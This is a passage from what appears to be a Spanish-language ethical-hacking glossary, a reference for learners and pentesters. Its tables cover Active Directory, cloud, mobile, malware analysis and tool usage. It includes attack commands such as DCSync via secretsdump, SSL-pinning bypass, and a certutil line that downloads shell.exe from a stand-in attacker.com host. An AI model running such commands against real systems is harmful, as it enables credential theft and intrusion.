| **Silver Ticket** | Forjar un ticket de servicio (ST) usando el hash de la cuenta de servicio, sin necesidad del DC. | Más sigiloso que el Golden Ticket. Acceso limitado al servicio específico. `mimikatz "kerberos::silver ..."`. |
| **DCSync** | Simular el comportamiento de un DC para solicitar replicación y obtener todos los hashes del dominio (incluyendo `krbtgt`). | Requiere permisos `DS-Replication-Get-Changes-All`. `secretsdump.py -just-dc domain/user:pass@<dc_ip>`. Monitorea Event ID 4662. |
| **BloodHound** | Herramienta de análisis de grafos que visualiza relaciones de AD y encuentra caminos de ataque hacia Domain Admin. | Recoge datos con `SharpHound` o `bloodhound-python`. Busca la query "Shortest path to Domain Admins" para encontrar el camino más corto. |
| **LAPS** | Local Administrator Password Solution: gestiona contraseñas de administrador local únicas y rotativas por equipo. | Mitiga Pass-the-Hash lateral. Verifica si está activo: `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd`. |
| **GPO** | Group Policy Object: políticas que se aplican a usuarios y equipos del dominio (scripts, restricciones, configuraciones). | GPOs mal configuradas con permisos de escritura para usuarios no privilegiados permiten escalada de privilegios o persistencia. Enumera con BloodHound. |

---

## ☁️ Cloud Security

| Término | Definición | Riesgo / Técnica |
| --- | --- | --- |
| **IAM (Cloud)** | Identity and Access Management: gestión de identidades, roles y permisos en la nube (AWS IAM, GCP IAM, Azure AD). | El exceso de permisos es el error más común. Audita con `PMapper` (AWS) o `ScoutSuite`. Principio de mínimo privilegio es crítico. |
| **S3 Buckets** | Servicio de almacenamiento de objetos de AWS. Los buckets públicos mal configurados son una fuente frecuente de filtraciones. | `aws s3 ls s3://nombre-bucket --no-sign-request`. Busca buckets con `grayhatwarfare.com`, `S3Scanner` o Google dorking `site:s3.amazonaws.com`. |
| **IMDS (Metadata Service)** | Servicio interno de instancias EC2/GCP/Azure que expone metadatos incluyendo credenciales temporales del rol IAM asociado. | Accesible desde `http://169.254.169.254/latest/meta-data/`. Un SSRF hacia esta IP es crítico. IMDSv2 en AWS mitiga el ataque al requerir un token previo. |
| **Container Escape** | Salir de un contenedor Docker/Kubernetes para acceder al host subyacente o al cluster. | Vectores: contenedor privilegiado (`--privileged`), montaje de `/` del host, socket Docker expuesto (`/var/run/docker.sock`). |
| **Kubernetes (K8s)** | Orquestador de contenedores. Mal configurado, permite escalar privilegios dentro del cluster o comprometer nodos. | Busca: API server expuesto (`kubectl --server=https://<ip>:6443`), pods con `hostNetwork: true`, secretos en variables de entorno, RBAC permisivo. |
| **Serverless** | Funciones efímeras (AWS Lambda, GCP Cloud Functions, Azure Functions) ejecutadas sin gestionar servidores. | Analiza permisos del rol de ejecución (puede acceder a DynamoDB, S3, SSM Parameter Store). Busca secretos en variables de entorno o logs de CloudWatch. |
| **ScoutSuite / Prowler** | Herramientas de auditoría multi-cloud que evalúan configuraciones contra CIS Benchmarks y buenas prácticas. | `scoutsuite aws --profile <profile>` genera un informe HTML. `prowler -M html` hace lo mismo con enfoque en compliance (CIS, PCI-DSS, HIPAA). |
| **CloudTrail / Audit Logs** | Servicio de registro de actividad API en AWS (CloudTrail), GCP (Cloud Audit Logs) y Azure (Activity Log). | Esencial para forense cloud. Busca creaciones de usuarios IAM, cambios en Security Groups, llamadas a `GetSecretValue` o `AssumeRole` inusuales. |
| **Secrets Manager** | Servicios para almacenar y rotar secretos: AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, HashiCorp Vault. | Mejor alternativa a variables de entorno o código fuente. Audita quién tiene permisos para leer qué secreto y si la rotación automática está activa. |

---

## 📱 Seguridad Móvil

| Término | Definición | Vector de ataque / Análisis |
| --- | --- | --- |
| **APK Analysis** | Análisis de aplicaciones Android (formato APK = ZIP con código, recursos y manifest). | Descompila con `apktool d app.apk` (smali) o `jadx` (Java legible). Busca claves API en `strings.xml`, URLs hardcodeadas, lógica de autenticación en cliente. |
| **ADB** | Android Debug Bridge: herramienta de línea de comandos para comunicarse con dispositivos Android. | `adb shell`, `adb pull`, `adb install`. En un pentest, si ADB está activo en producción, es acceso directo al dispositivo. |
| **Frida** | Framework de instrumentación dinámica que permite inyectar scripts JavaScript en procesos de iOS/Android. | Hookea funciones en tiempo real para bypasear SSL pinning, modificar lógica de autenticación o extraer claves. `frida -U -n com.app.name -l script.js`. |
| **SSL Pinning** | Mecanismo que compara el certificado del servidor con uno embebido en la app para resistir proxies MITM. | Bypass: Frida + script de bypass (objection), `apktool` + modificar el `network_security_config.xml`, o `apk-mitm` automatizado. |
| **Deep Links** | URLs especiales (`scheme://`) que abren una app en una pantalla específica o ejecutan una acción. | Analiza el `AndroidManifest.xml` para encontrar Activities exportadas que acepten Intents. Un deep link malicioso puede bypassear controles de autenticación. |
| **IPA Analysis** | Análisis de aplicaciones iOS (formato IPA = ZIP con binario Mach-O y recursos). | Desencripta con `frida-ios-dump` o en jailbreak con `clutch`. Analiza el binario con `class-dump`, Hopper o Ghidra. Busca claves en Keychain y plist. |
| **OWASP Mobile Top 10** | Lista de los riesgos más críticos en apps móviles: credenciales inseguras, autenticación débil, almacenamiento inseguro, etc. | Usa como checklist en cada auditoría móvil. Complementa con la guía MSTG (Mobile Security Testing Guide) de OWASP para procedimientos detallados. |

---

## 🧬 Malware y Análisis de Amenazas

| Término | Definición | Análisis / Detección |
| --- | --- | --- |
| **RAT** | Remote Access Trojan: malware que otorga control remoto completo del sistema infectado al atacante. | IOCs comunes: proceso inusual con conexión saliente, persistencia en Run keys, comunicación C2 cifrada. Detecta con reglas YARA o firmas en el EDR. |
| **Dropper** | Malware cuya función es descargar e instalar el payload principal (el malware real) en el sistema. | El dropper suele ser pequeño y ofuscado; el payload se descarga cifrado para evadir AV. Analiza en sandbox y extrae el payload de la memoria. |
| **Packer / Obfuscator** | Herramienta que comprime, cifra u ofusca un binario para dificultar el análisis estático y evadir AV/EDR. | `UPX`, `Themida`, packers custom. Identifica con `DiE (Detect It Easy)` o `PEiD`. El unpacking es necesario antes del análisis estático. |
| **Sandbox** | Entorno aislado y monitorizado donde se ejecuta malware para observar su comportamiento sin riesgo. | Servicios: ANY.RUN, VirusTotal (limitado), Hybrid Analysis, Cuckoo (self-hosted). Analiza: llamadas al sistema, red, persistencia, archivos creados. |
| **YARA** | Lenguaje de reglas para identificar y clasificar malware basándose en patrones de cadenas, bytes y condiciones lógicas. | Crea reglas para familias específicas y despliégalas en EDR, SIEM o herramientas de hunting. Repositorios: `Yara-Rules` en GitHub. |
| **Análisis estático** | Examinar el malware sin ejecutarlo: strings, importaciones, cabecera PE, desensamblado, descompilación. | Herramientas: `strings`, `pestudio`, `CFF Explorer`, Ghidra, IDA Pro (Free). Busca: URLs/IPs, rutas de archivos, mutex, claves de registro. |
| **Análisis dinámico** | Ejecutar el malware en un entorno controlado y monitorizar su comportamiento en tiempo real. | Herramientas: Process Monitor, Wireshark, Regshot, x64dbg/x32dbg (debugging). Prepara un snapshot de VM limpio antes de cada ejecución. |
| **Rootkit** | Malware diseñado para ocultar su presencia y la de otros programas en el sistema, a menudo a nivel de kernel. | Tipos: userland (hooks en DLLs), kernel (drivers maliciosos), bootkit (infección del MBR/UEFI). Detección: volatility (`malfind`, `ldrmodules`), comparación de listas de procesos. |
| **Fileless Malware** | Malware que opera en memoria sin escribir archivos en disco, abusando de herramientas legítimas del sistema (PowerShell, WMI, LOLBins). | Muy difícil de detectar con AV tradicional. Deja huellas en logs de PowerShell, eventos de WMI, y en memoria. Detecta con EDR y reglas de comportamiento. |
| **LOLBins** | Living Off the Land Binaries: herramientas legítimas del SO (certutil, regsvr32, mshta, wscript) abusadas para ejecutar código malicioso. | `certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe`. El objetivo es mezclarse con tráfico legítimo. Monitorea estas ejecuciones con Event ID 4688 y SYSMON. |

---

## 🧰 Herramientas Esenciales

| Herramienta | Categoría | Uso principal |
| --- | --- | --- |
| **Nmap** | Escaneo de red | `nmap -sV -sC -p- -oN scan.txt <target>` — escaneo completo con scripts y versiones. Añade `-T4` para acelerar en labs. |
| **Burp Suite** | Web / Proxy | Intercepta y modifica tráfico HTTP/S. Módulos clave: Proxy, Repeater, Intruder, Scanner (Pro). Indispensable en web pentesting. |
| **Metasploit** | Framework de explotación | `msfconsole`, workspaces por objetivo, módulos `exploit/`, `auxiliary/`, `post/`. Genera payloads con `msfvenom`. |
| **Wireshark / tshark** | Análisis de tráfico | Captura y analiza paquetes en tiempo real. `tshark -r file.pcap -Y "http.request"` para filtrado por línea de comandos. |
| **Impacket** | Active Directory / Windows | Suite Python para ataques AD: `secretsdump`, `psexec`, `wmiexec`, `GetUserSPNs`, `ntlmrelayx`. La navaja suiza del pentesting Windows. |
| **BloodHound** | Active Directory | Visualiza y analiza relaciones en AD para encontrar caminos de escalada a Domain Admin. Ingiere datos de SharpHound o bloodhound-python. |
| **Volatility 3** | Forense de memoria | Analiza dumps de RAM: `windows.pslist`, `windows.netscan`, `windows.malfind`. Base para análisis de malware en memoria. |
| **Ghidra** | Reversing | Desensamblador y descompilador gratuito de NSA. Soporta múltiples arquitecturas. Alternativa libre a IDA Pro. |
| **sqlmap** | Web / SQLi | Automatiza detección y explotación de inyecciones SQL. `sqlmap -r req.txt --level=5 --risk=3 --dbs`. |
| **ffuf** | Web / Fuzzing | Fuzzer HTTP ultrarrápido. `ffuf -u https://target/FUZZ -w wordlist.txt -fc 404 -o output.json`. |
| **Hashcat** | Cracking | GPU-accelerated password cracker. Soporta más de 350 tipos de hash. `hashcat -m 1000 hashes.txt rockyou.txt`. |
| **John the Ripper** | Cracking | Versátil para CPU cracking. `john --wordlist=rockyou.txt hashes.txt`. Soporta muchos formatos y reglas de mutación. |
| **Aircrack-ng** | WiFi | Suite para auditoría WiFi: `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`. Esencial para labs 802.11. |
| **Nuclei** | Escaneo de vulnerabilidades | Motor de templates para detección automatizada de vulnerabilidades. `nuclei -u https://target.com -t cves/`. Comunidad muy activa de templates. |
| **Gobuster / ffuf** | Web / Enumeración | Enumeración de directorios y subdominios. `gobuster dir -u https://target -w wordlist -x php,html`. |
| **CyberChef** | Utilidades | Aplicación web para transformaciones de datos: decode base64, XOR, hash, parsing de formatos. Alias: "la navaja suiza de los datos". |

---

## 💡 Tips Extra

> [!TIP]
> Mantén este diccionario actualizado: cada nuevo término que aprendas es una pieza más en tu arsenal de conocimiento. 🧠

- **Documenta siempre**: apunta la fuente (CVE, blog, libro, lab), los comandos exactos y los resultados obtenidos. Un buen pentest es 50% técnica y 50% documentación.
- **Referencia cruzada**: combina conceptos de distintas secciones. Un SSRF + Metadata Service + credenciales IAM es una cadena de ataque completa.
- **Laboratorio primero**: nunca apliques técnicas en entornos de producción sin autorización escrita. Reproduce todo en tu lab antes de ejecutar en el objetivo.
- **Metodologías de referencia**: OWASP Testing Guide, PTES (Penetration Testing Execution Standard), OSSTMM, y MITRE ATT&CK son tus marcos de trabajo.
- **Contribuye**: si un término no aparece aquí, añádelo siguiendo el formato de la tabla correspondiente y abre un PR. La comunidad lo agradece.
- **Cursos y recursos**: HackTheBox, TryHackMe, PortSwigger Web Academy (gratis), PentesterLab. Práctica > teoría.

---

*Hecho con 💜 para la comunidad de hacking ético — ¡hack the planet!* 🌍
